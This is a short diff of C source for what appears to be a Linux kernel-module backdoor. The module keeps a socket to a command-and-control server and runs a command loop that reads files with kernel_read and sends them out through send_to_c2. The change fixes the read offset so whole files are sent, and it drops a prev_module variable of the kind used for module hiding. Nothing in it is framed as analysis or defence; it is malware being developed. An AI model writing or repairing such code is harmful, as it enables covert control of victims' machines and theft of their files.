@@ -41,7 +41,6 @@ static struct socket *g_sock = NULL;
 static struct task_struct *g_conn_thread = NULL;
 static struct task_struct *g_cmd_thread = NULL;
 static int connection_state = 0;
-static struct list_head *prev_module = NULL;
 static char working_directory[256] = "/";
 
 static void notify_connection_state(int new_state) {
@@ -173,6 +172,7 @@ static int command_loop(void *data) {
                 rlen = kernel_read(f, pos, outbuf, sizeof(outbuf) - 1);
                 if (rlen > 0) {
                     send_to_c2(outbuf, rlen);
+                    pos += rlen;
                 }
             } while (rlen > 0);
             filp_close(f, NULL);
